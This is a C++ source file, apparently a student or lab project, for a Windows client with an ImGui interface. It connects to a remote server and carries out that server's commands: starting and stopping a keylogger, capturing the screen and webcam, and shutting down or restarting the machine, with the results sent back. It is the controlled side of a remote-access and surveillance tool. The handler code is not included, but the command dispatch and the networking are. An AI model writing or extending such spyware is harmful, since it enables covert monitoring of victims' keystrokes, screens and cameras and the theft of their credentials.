
#define UNICODE

#include <bits/stdc++.h>

#include <SFML/Graphics.hpp>
#include <SFML/Network.hpp>
#include <SFML/Audio.hpp>
#include <imgui.h>
#include <imgui-SFML.h>

#include "PeerConnection.hpp"
#include "ThreadWrapper.hpp"
#include "ImGuiStdString.hpp"
#include "ImGuiScrollableText.hpp"
#include "Message.hpp"
#include "InternalUtilities.hpp"
#include "Engine.hpp"

#define DEFAULT_PORT 62300

sf::SoundBuffer connectedSoundBuffer, disconnectedSoundBuffer;
sf::Sound connectedSound, disconnectedSound;

std::mutex socketMutex;

std::string inputBuffer;

GuiScrollableTextDisplay miniConsole;

int MessageExecute(const Message& inputMessage, Message& outputMessage);

class ServerConnection : public PeerConnection {
public:
    std::atomic<bool> connecting{false};

    bool connectToServer(const std::string& address = "127.0.0.1", uint16_t port = DEFAULT_PORT) {
        if (connecting.load() || active.load()) return false;

        connecting.store(true);

        std::lock_guard<std::mutex> lock(socketMutex);
        int newSocket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (newSocket == -1) {
            connecting.store(false);
            return false;
        }

        // Set socket options
        int reuse = 1;
        setsockopt(newSocket, SOL_SOCKET, SO_REUSEADDR, 
                  reinterpret_cast<const char*>(&reuse), sizeof(reuse));

        sockaddr_in sa;
        memset(&sa, 0, sizeof(sa));
        sa.sin_family = AF_INET;
        sa.sin_port = htons(port);
        inet_pton(AF_INET, address.c_str(), &sa.sin_addr);

        if (connect(newSocket, reinterpret_cast<sockaddr*>(&sa), sizeof(sa)) == -1) {
            closesocket(newSocket);
            connecting.store(false);
            return false;
        }

        socketfile.store(newSocket);
        connecting.store(false);
        peerIp = address;
        peerPort = port;
        connectionTime = std::chrono::system_clock::now();
        funcStruct.reset();
        active.store(true);

        // Start listener thread
        std::thread([this]() {
            listenToServer();
        }).detach();

        return sendPublicKey();
    }

    void disconnect() {
        PeerConnection::disconnect();

        connecting.store(false);
        miniConsole.AddLineInfo("Self-disconnected");
        disconnectedSound.play();

        //Stop all running engine
        KeyloggerEngine::getInstance().shouldStop();
    }

private:
    void listenToServer() {
        while (active.load()) {
            auto status = receiveData();
            switch (status) {
                case ReceiveStatus::Success: {
                    Message msg;
                    if (processCompleteMessage(msg)) {
                        std::thread([msg, this]() {
                            Message outMsg;
                            if (MessageExecute(msg, outMsg)) {
                                miniConsole.AddLineSuccess("Successfully execute message");
                                if(this->sendData(outMsg)) {
                                    miniConsole.AddLineSuccess("Successfully sent output message");
                                } else {
                                    miniConsole.AddLineSuccess("Failed to sent output message");
                                }
                            } else {
                                miniConsole.AddLineError("Failed to execute message");
                            }
                        }).detach();
                    } else {
                        miniConsole.AddLineError("Failed to process message");
                    }
                    break;
                }
                case ReceiveStatus::KeyExchange:
                    miniConsole.AddLineSuccess("Successfully exchange key");
                    break;
                case ReceiveStatus::PeerDisconnected:
                    miniConsole.AddLineWarning("Disconnected from server");
                    break;
                case ReceiveStatus::NeedMoreData:
                    // Wait for more data
                    std::this_thread::sleep_for(std::chrono::milliseconds(10));
                    break;
                case ReceiveStatus::Error:
                    break;
            }
        }
    }
};

ServerConnection connectionManager;

int MessageExecute(const Message& inputMessage, Message& outputMessage) {
    int command = inputMessage.commandNumber;
    switch(command) {
        case MessageRawText: {
            connectionManager.funcStruct.rawText = std::string(inputMessage.getBinaryData(), inputMessage.getBinaryDataSize());
            return 1;
            //do not send back;
        }
        case MessageEnableKeylog: {
            if(EnableKeyloggerHandler(inputMessage, outputMessage)) {
                connectionManager.funcStruct.isKeyloggerActive = true;
                return 1;
            } else {
                connectionManager.funcStruct.isKeyloggerActive = false;
                return 0;
            }
        }
        case MessageDisableKeylog: {
            if(DisableKeyloggerHandler(inputMessage, outputMessage)) {
                connectionManager.funcStruct.isKeyloggerActive = false;
                return 1;
            } else {
                connectionManager.funcStruct.isKeyloggerActive = true;
                return 0;
            }
        }
        case MessageScreenCap: {
            if(ScreenCapHandler(inputMessage, outputMessage)) {
                miniConsole.AddLineInfo("Screen captured");
                return 1;
            } else {
                miniConsole.AddLineError("CAn't capture screen");
                return 0;
            }
        }
        case MessageInvokeWebcam: {
            connectionManager.funcStruct.isWebcamActive = true;
            int status = InvokeWebcamHandler(inputMessage, outputMessage);
            if(status) {
                miniConsole.AddLineInfo("Webcam captured. Woo!");
            } else {
                miniConsole.AddLineError("CAn't capture webcam");
            }
            connectionManager.funcStruct.isWebcamActive = false;
            return status;
        }
        case MessageShutdownMachine: {
            (void) ShutdownEngine(inputMessage, outputMessage);
            return true;
        }
        case MessageRestartMachine: {
            (void) RestartEngine(inputMessage, outputMessage);
            return true;
        }
        
        default: break;
    }
    return 0;
}

void RunGui() {
    ImGuiIO& io = ImGui::GetIO(); (void)io;

    ImGui::Begin("Client", nullptr, ImGuiWindowFlags_None);
    
    ImGui::SeparatorText("Connection Status");
    if (connectionManager.isActive()) {
        ImGui::TextColored(ImVec4(0, 1, 0, 1), "Status: Connected");
        if (ImGui::Button("Disconnect")) {
            std::thread([] {
                connectionManager.disconnect();
            }).detach();
        }
    } else if (connectionManager.connecting.load()) {
        ImGui::TextColored(ImVec4(1, 1, 0, 1), "Status: Connecting...");
        if (ImGui::Button("Cancel")) {
            connectionManager.disconnect();
        }
    } else {
        static char ipAddressBuffer[64] = "127.0.0.1";
        static int portNumber = DEFAULT_PORT;
        ImGui::TextColored(ImVec4(1, 0, 0, 1), "Status: Disconnected");
        ImGui::Text("IP Address:");
        ImGui::SameLine();
        if (ImGui::InputText("##IP", ipAddressBuffer, sizeof(ipAddressBuffer))) {
            
        }
        ImGui::Text("Port:");
        ImGui::SameLine();

        if (ImGui::InputInt("##Port", &portNumber)) {
            portNumber = std::max(1024, std::min(portNumber, 65535));
        }

        if (ImGui::Button("Connect")) {
            std::thread([] {
                if (connectionManager.connectToServer(std::string(ipAddressBuffer), portNumber)) {
                    connectedSound.play();
                }
            }).detach();
        }
    }

    if (connectionManager.isActive()) {
        ImGui::SeparatorText("Raw messages received");
        if (ImGui::BeginChild("GuiRawMessages", ImVec2(-1, 150), true)) {
            ImGui::TextWrapped("%s", connectionManager.funcStruct.rawText.c_str());
            if (ImGui::GetScrollY() >= ImGui::GetScrollMaxY()) {
                ImGui::SetScrollHereY(1.0f);
            }
        }
        ImGui::EndChild();
        //Clear button
        if (ImGui::Button("Clear Messages")) {
            connectionManager.funcStruct.rawText = "";
        }

        ImGui::BeginDisabled();
        ImGui::Checkbox("IsKeylogger", &connectionManager.funcStruct.isKeyloggerActive);
        ImGui::Checkbox("IsWebcam", &connectionManager.funcStruct.isWebcamActive);
        ImGui::EndDisabled();
    }
    ImGui::SeparatorText("Console");
    miniConsole.Draw();

    ImGui::End();
}

void RunSFMLBackend() {
    sf::RenderWindow window(sf::VideoMode(800, 600), "Network Client", 
                           sf::Style::Titlebar | sf::Style::Close);
    window.setVerticalSyncEnabled(true);
    
    if (!ImGui::SFML::Init(window)) {
        throw std::runtime_error("Failed to initialize ImGui-SFML");
    }
    ImGui::StyleColorsDark();
    ImGui::GetIO().IniFilename = nullptr;

    // Load sound resources with error checking
    try {
        if (!connectedSoundBuffer.loadFromFile("asset/CONNECTED.ogg")) {
            throw std::runtime_error("Failed to load asset/CONNECTED.ogg");
        }
        connectedSound.setBuffer(connectedSoundBuffer);
        
        if (!disconnectedSoundBuffer.loadFromFile("asset/DISCONNECTED.ogg")) {
            throw std::runtime_error("Failed to load asset/DISCONNECTED.ogg");
        }
        disconnectedSound.setBuffer(disconnectedSoundBuffer);
    } catch (const std::exception& e) {
        std::cerr << "Sound loading error: " << e.what() << std::endl;
    }

    sf::Clock deltaClock;
    while (window.isOpen()) {
        sf::Event event;
        while (window.pollEvent(event)) {
            ImGui::SFML::ProcessEvent(window, event);
            if (event.type == sf::Event::Closed) {
                window.close();
            }
        }

        ImGui::SFML::Update(window, deltaClock.restart());
        RunGui();
        
        window.clear(sf::Color(30, 30, 40));
        ImGui::SFML::Render(window);
        window.display();
    }

    ImGui::SFML::Shutdown();
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, WCHAR *lpCmdLine, int nCmdShow) {
    UNREFERENCED_PARAMETER(hInstance);
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);
    UNREFERENCED_PARAMETER(nCmdShow);
    //Attach console for debugging
    
    /*
    if (AttachConsole(ATTACH_PARENT_PROCESS) || AllocConsole()) {
        freopen("CONOUT$", "w", stdout);
        freopen("CONOUT$", "w", stderr);
    }
    */

    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;

    // Initialize GDI+
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed: " << WSAGetLastError() << std::endl;
        return 1;
    }

    try {
        RunSFMLBackend();
    } catch (const std::exception& e) {
        std::cerr << "Fatal error: " << e.what() << std::endl;
    }

    connectionManager.disconnect();

    WSACleanup();
    Gdiplus::GdiplusShutdown(gdiplusToken);
    return 0;
}